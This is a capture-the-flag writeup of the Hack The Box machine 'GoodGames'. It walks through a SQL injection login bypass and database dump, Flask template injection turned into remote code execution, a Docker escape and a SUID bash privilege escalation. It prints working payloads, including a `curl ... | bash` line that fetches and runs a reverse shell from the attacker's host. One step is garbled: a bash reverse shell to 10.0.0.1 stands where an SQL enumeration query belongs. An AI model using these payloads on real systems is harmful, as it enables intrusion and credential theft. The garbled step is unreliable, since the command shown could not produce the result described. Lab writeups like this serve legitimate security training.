# GoodGames - Writeup

**Date**: 09/06/2022

**Difficulty**: Easy

**CTF**: [https://app.hackthebox.com/machines/GoodGames](https://app.hackthebox.com/machines/GoodGames)

---

Let’s start with a ping to see if we have connection with the machine:

![Untitled](images/Untitled.png)

The ttl=63 indicates us that the target is probably a Linux machine.

Let’s scan all the TCP ports to see which ones are open:

![Untitled](images/Untitled%201.png)

Nmap discovered a single open TCP port, the 80 (http). Let’s see if we can obtain more info of this service:

![Untitled](images/Untitled%202.png)

We got interesting information. First of all, the version of the Apache (2.4.51). Also, the header may indicate that the server is running Werkzeug (2.0.2) and Python (3.9.2) sometimes it is vulnerable to Server Side Template Injection (SSTI). And the Service Info is telling us the domain being used: goodgames.htm. Maybe the server is applying Virtual Hosting, so we should add this domain to etc/hosts file.

![Untitled](images/Untitled%203.png)

Let’s use whatweb to try to obtain more info of the website hosted in the http service:

![Untitled](images/Untitled%204.png)

Nothing new, let’s see how the page looks:

![Untitled](images/Untitled%205.png)

I appreciate no difference between the website accessed via IP or domain, so I’m going to use the domain.

Let’s hear what Wappalizer has to say:

![Untitled](images/Untitled%206.png)

The server is using Flask (2.0.2) and jQuery (3.3.1) According to [this page](https://snyk.io/test/npm/jquery/3.3.1) this version of jQuery is vulnerable to XSS injection and prototype pollution. But I haven’t found a valid input to insert the XSS payload…

Let’s take a look to the web content:

The main page has post previews, news previews, image previews…

![Untitled](images/Untitled%207.png)

There is a directory called static with a subdirectory called images.

Let’s try to visit goodgames.htb/static/images and goodgames.htb/static

![Untitled](images/Untitled%208.png)

![Untitled](images/Untitled%209.png)

There is no directory listing.

Let’s see the Blog:

![Untitled](images/Untitled%2010.png)

There are 14 pages of blog entries but only the first one works. The author of each post appears, so they may be valid users.

And the store link redirect us here:

![Untitled](images/Untitled%2011.png)

There is also login form in the main page:

![Untitled](images/Untitled%2012.png)

Let’s try to sign in

![Untitled](images/Untitled%2013.png)

![Untitled](images/Untitled%2014.png)

And, let’s log in:

![Untitled](images/Untitled%2015.png)

There is nothing I can do in this panel but changing my password…

![Untitled](images/Untitled%2016.png)

And, if I try it, it breaks. Let’s intercept the petition using Burpsuite:

![Untitled](images/Untitled%2017.png)

Nothing interesting I think.

Going back to the main page, I don’t really know if I was able to access to this post before login in, but now I have access:

![Untitled](images/Untitled%2018.png)

![Untitled](images/Untitled%2019.png)

And I can leave a reply! Let’s try some XSS!

![Untitled](images/Untitled%2020.png)

Mmm… The server doesn’t allow me to post normal messages and it drops a server internal error.

With nothing in mind, let’s try to enumerate web directories:

First of all, let’s see if there is any other blog entry:

![Untitled](images/Untitled%2021.png)

Nope

OK, let’s go back to the login page. Let’s see if it’s vulnerable to SQLi

![Untitled](images/Untitled%2022.png)

Apparently it requires a valid email address… Let’s insert a valid email address here and intercept the petition with Burpsuite to try to manipulate the data sent:

![Untitled](images/Untitled%2023.png)

Let’s substitute the email input for `admin' OR 1=1-- -`

![Untitled](images/Untitled%2024.png)

And url-encode it:

![Untitled](images/Untitled%2025.png)

Let’s forward the petition…

![Untitled](images/Untitled%2026.png)

And done! we bypassed the login… Let’s try to see if we can enumerate the database. First of all, let’s intercept the login petition again and send it to the repeater:

![Untitled](images/Untitled%2027.png)

Now, let’s try to guess the number of columns of the users table using `UNION SELECT`

![Untitled](images/Untitled%2028.png)

The table has 4 columns, and the welcome message is printing the 4th one.

Let’s now discover the name of the database using `database()`

![Untitled](images/Untitled%2029.png)

The database’s name is `main`

Let’s gather the list of tables of the database using `group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'main'`

![Untitled](images/Untitled%2030.png)

The tables are `blog`, `blog_comments` and `user`

Let’s see the columns of `user` table using: `group_concat(column_name) FROM information_schema.columns WHERE table_name = 'user'`

![Untitled](images/Untitled%2031.png)

The columns of the user table are called `id`, `email`, `password` and `name`

Let’s enumerate it all using: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

![Untitled](images/Untitled%2032.png)

There is only one entry: `admin@goodgames.htb : 2b22337f218b2d82dfc3b6f77e7cb8ec` 

It looks like a hashed password.

![Untitled](images/Untitled%2033.png)

Probably MD5. Let’s try to use rainbow tables to crack it, if it’s not in rainbow tables maybe we can try to crack it using John.

![Untitled](images/Untitled%2034.png)

That’s a weak password hahaha. Let’s anotate it, I’m sure I’ll need it soon.

Let’s try to log to the website again, but now with the obtained credentials:

![Untitled](images/Untitled%2035.png)

![Untitled](images/Untitled%2036.png)

So, now we are logged as an administrator.

![Untitled](images/Untitled%2037.png)

This button was not there before… let’s check it.

![Untitled](images/Untitled%2038.png)

It redirected us to a subdomain that I had to include in the /etc/hosts file. It shows up a login page. Let’s try to use the same credentials we used to log in as the admin user before:

![Untitled](images/Untitled%2039.png)

Aaaand we are in… It has 3 tabs, but this one is interesting, as is the only one that seems to allows us to modify anything:

![Untitled](images/Untitled%2040.png)

![Untitled](images/Untitled%2041.png)

![Untitled](images/Untitled%2042.png)

Let’s remember that this site uses flask… Maybe it is vulnerable to STTI?

![Untitled](images/Untitled%2043.png)

Yeah! It is. Let’s try to read the `/ect/passwd` file using this SSTI payload `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`

![Untitled](images/Untitled%2044.png)

So… we can convert SSTI to RCE using this payload: `{{config.__class__.__init__.__globals__['os'].popen('<your code>').read()}}`

Let’s try to deploy a Rev Shell using this! As we know that the target system uses python, let’s try to execute a python script. To make it easier, I have created a file in my computer called pwn and shared it via http.server:

![Untitled](images/Untitled%2045.png)

If we execute the command `curl 10.10.14.234/pwn | bash` in the target machine, it should read the pwn file and send it to the bash to interpret it and establish a connection with my machine. Let’s see if it works:

`{{config.__class__.__init__.__globals__['os'].popen('curl 10.10.14.234/pwn | bash').read()}}`

![Untitled](images/Untitled%2046.png)

Yeah! We got a Reverse Shell!

![Untitled](images/Untitled%2047.png)

Uh… Dockerfile… Let’s check the IP to see if we are inside the target machine or inside a container…

![Untitled](images/Untitled%2048.png)

Bad news, we are inside a container. Let’s see what we have here anyway.

![Untitled](images/Untitled%2049.png)

![Untitled](images/Untitled%2050.png)

![Untitled](images/Untitled%2051.png)

Mmm… it looks like it is running a postgresql database in [localhost](http://localhost):5432 and the credentials are appseed:pass

![Untitled](images/Untitled%2052.png)

Here we have an sqlite3 database file, interesting. Let’s check if there is anything in the home folder:

![Untitled](images/Untitled%2053.png)

Yep, there is the user flag!

Ok, now we have to think how to escape the docker environment and jump to the target machine.

If we take a look to the permissions of the files inside augustus folder…

![Untitled](images/Untitled%2054.png)

We can see that there are files that belong to “1000”. It may indicate that the user’s home directory is mounted inside the docker container… let’s check it with `mount`

![Untitled](images/Untitled%2055.png)

We have seen before that our IP Address was `172.19.0.2` , as Docker usually assigns the first address available of the subnet, the host might be on `172.19.0.1`

![Untitled](images/Untitled%2056.png)

I send a ping either to 172.19.0.3 and 172.19.0.1. First one did nothing, but the second one was received, so there is something in that IP that we should scan.

![Untitled](images/Untitled%2057.png)

The machine has no nmap installed, so we can do the scan with bash:

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

![Untitled](images/Untitled%2058.png)

Port 22 is open and port 80 is open too. Port 22 is SSH so let’s try to connect using the credentials we have:

![Untitled](images/Untitled%2059.png)

admin didn’t work. How about augustus?

![Untitled](images/Untitled%2060.png)

Yeah, it worked!

Let’s see how to escalate privileges:

![Untitled](images/Untitled%2061.png)

No sudoers, not interesting SUIDs…

![Untitled](images/Untitled%2062.png)

Nothing on crontab…

![Untitled](images/Untitled%2063.png)

No capabilities… Out of ideas I’m going to enumerate with LinPeas…

Ok, Nothing useful in LinPeas…

How about copying /bin/bash in the home folder of august, exiting the ssh, changing the SUID and log into the target machine again via SSH to run bash as administrator? Let’s try it.

First of all, lets copy /bin/bash in the home folder:

![Untitled](images/Untitled%2064.png)

Now, let’s exit the ssh and change the owner of the file and make it SUID:

![Untitled](images/Untitled%2065.png)

Now, let’s login as augustus via ssh again:

![Untitled](images/Untitled%2066.png)

And execute the bash binary with owner perms:

![Untitled](images/Untitled%2067.png)

![Untitled](images/Untitled%2068.png)

Done!